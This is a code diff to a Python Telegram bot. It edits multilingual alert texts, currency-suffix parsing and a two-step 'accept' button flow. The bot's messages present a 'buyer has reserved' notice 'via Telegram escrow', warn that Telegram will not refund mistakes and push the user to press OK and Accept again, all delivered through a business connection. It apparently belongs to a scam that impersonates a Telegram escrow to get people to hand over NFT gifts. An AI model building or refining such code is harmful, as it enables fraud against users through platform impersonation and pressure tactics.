@@ -58,7 +58,7 @@ T = {
             "⚠️ Следуйте инструкции внимательно.\n\n"
             "Если вы передадите другой подарок или ошибётесь при подтверждении, "
             "Telegram не вернёт средства и не зачислит оплату автоматически.\n\n"
-            "Если вы ознакомились, нажмите «Ок»."
+            "Если ознакомились — нажмите «Ок» и затем ещё раз «Принять»."
         ),
         "instr_title": "Покупатель зарезервировал",
         "instr_via": "через эскроу-систему Telegram.",
@@ -95,7 +95,7 @@ T = {
             "⚠️ Дотримуйтесь інструкції уважно.\n\n"
             "Якщо ви передасте інший подарунок або помилитесь при підтвердженні, "
             "Telegram не поверне кошти і не зарахує оплату автоматично.\n\n"
-            "Якщо ви ознайомились, натисніть «Ок»."
+            "Якщо ознайомились — натисніть «Ок» і потім ще раз «Прийняти»."
         ),
         "instr_title": "Покупець зарезервував",
         "instr_via": "через ескроу-систему Telegram.",
@@ -132,7 +132,7 @@ T = {
             "⚠️ Follow the instructions carefully.\n\n"
             "If you send the wrong gift or confirm by mistake, Telegram will not "
             "return the funds and will not credit the payment automatically.\n\n"
-            "If you understand, press «OK»."
+            "If you understand — press «OK» and then «Accept» again."
         ),
         "instr_title": "The buyer has reserved",
         "instr_via": "via Telegram escrow.",
@@ -169,7 +169,7 @@ T = {
             "⚠️ 请严格按照说明操作。\n\n"
             "如果您发送了错误的礼物或错误地确认，Telegram 将不会退还资金，"
             "也不会自动记入付款。\n\n"
-            "如果您已了解，请点击「确定」。"
+            "如果您已了解 — 请点击「确定」，然后再次点击「接受」。"
         ),
         "instr_title": "买家已预留",
         "instr_via": "通过 Telegram 托管系统。",
@@ -242,7 +242,6 @@ def parse_command(text):
     for p in parts:
         low = p.lower()
         if link is None and (p.startswith("http") or p.startswith("t.me") or "t.me/" in p):
-            # нормализуем: добавим https:// если нет
             link = p if p.startswith("http") else f"https://{p}"
             continue
         if low in LANG_TAGS:
@@ -255,17 +254,24 @@ def parse_command(text):
             elif low in ("cn", "zh"):
                 lang = "cn"
             continue
-        if low == "gram":
+        if low in ("g", "gram", "грам", "грамм"):
             currency = "GRAM"
             continue
-        if low in ("stars", "star", "звёзд", "звезд", "звёзды", "звезды"):
+        if low in ("s", "stars", "star", "звёзд", "звезд", "звёзды", "звезды"):
             currency = "STARS"
             continue
         if amount is None:
-            try:
-                amount = int(float(p.replace(",", ".")))
-            except ValueError:
-                pass
+            # поддержка "817g" / "817s" слитно: число+суффикс валюты
+            m = re.fullmatch(r"(\d+(?:[.,]\d+)?)([gs]?)", low)
+            if m:
+                try:
+                    amount = int(float(m.group(1).replace(",", ".")))
+                    if m.group(2) == "g":
+                        currency = "GRAM"
+                    elif m.group(2) == "s":
+                        currency = "STARS"
+                except ValueError:
+                    pass
 
     if not link or amount is None:
         return None
@@ -674,37 +680,41 @@ async def on_accept(cb: CallbackQuery):
     meta["last_click_at"] = time.time()
     lang = meta["lang"]
 
-    # СНАЧАЛА показываем модальный alert — чтоб точно вылез даже если edit тупит
-    await cb.answer(t(lang, "alert"), show_alert=True)
-
-    # уже в инструкции — не редактируем повторно
-    if meta["state"] == "INSTRUCTION":
+    # первый клик — РОВНО как on_confirm при ошибке: только модальный alert и return
+    if meta["state"] != "ALERT_SHOWN" and meta["state"] != "INSTRUCTION":
+        meta["state"] = "ALERT_SHOWN"
+        await cb.answer(t(lang, "alert"), show_alert=True)
         return
 
-    # ПОТОМ разворачиваем сообщение в инструкцию
-    try:
-        await bot.edit_message_text(
-            chat_id=meta["chat_id"],
-            message_id=meta["msg_id"],
-            text=build_instruction(
-                meta["amount"], meta["currency"],
-                meta["gift_name"], meta["gift_num"],
-                order_id, lang,
-                meta["username"], meta["user_id"],
-                meta["nft_url"], meta["expires_at"],
-            ),
-            reply_markup=kb_instruction(lang, order_id, meta["username"], meta["user_id"]),
-            business_connection_id=meta["bcid"],
-            link_preview_options=LinkPreviewOptions(
-                is_disabled=False,
-                prefer_large_media=True,
-                show_above_text=True,
-            ),
-        )
-        meta["state"] = "INSTRUCTION"
-        meta["last_edit_at"] = time.time()
-    except TelegramBadRequest as e:
-        logging.error(f"accept->instruction edit: {e}")
+    # второй клик после alert — разворачиваем инструкцию
+    if meta["state"] == "ALERT_SHOWN":
+        try:
+            await bot.edit_message_text(
+                chat_id=meta["chat_id"],
+                message_id=meta["msg_id"],
+                text=build_instruction(
+                    meta["amount"], meta["currency"],
+                    meta["gift_name"], meta["gift_num"],
+                    order_id, lang,
+                    meta["username"], meta["user_id"],
+                    meta["nft_url"], meta["expires_at"],
+                ),
+                reply_markup=kb_instruction(lang, order_id, meta["username"], meta["user_id"]),
+                business_connection_id=meta["bcid"],
+                link_preview_options=LinkPreviewOptions(
+                    is_disabled=False,
+                    prefer_large_media=True,
+                    show_above_text=True,
+                ),
+            )
+            meta["state"] = "INSTRUCTION"
+            meta["last_edit_at"] = time.time()
+        except TelegramBadRequest as e:
+            logging.error(f"accept->instruction edit: {e}")
+        await cb.answer()
+        return
+
+    await cb.answer()
 
 
 @dp.callback_query(F.data.startswith("confirm:"))
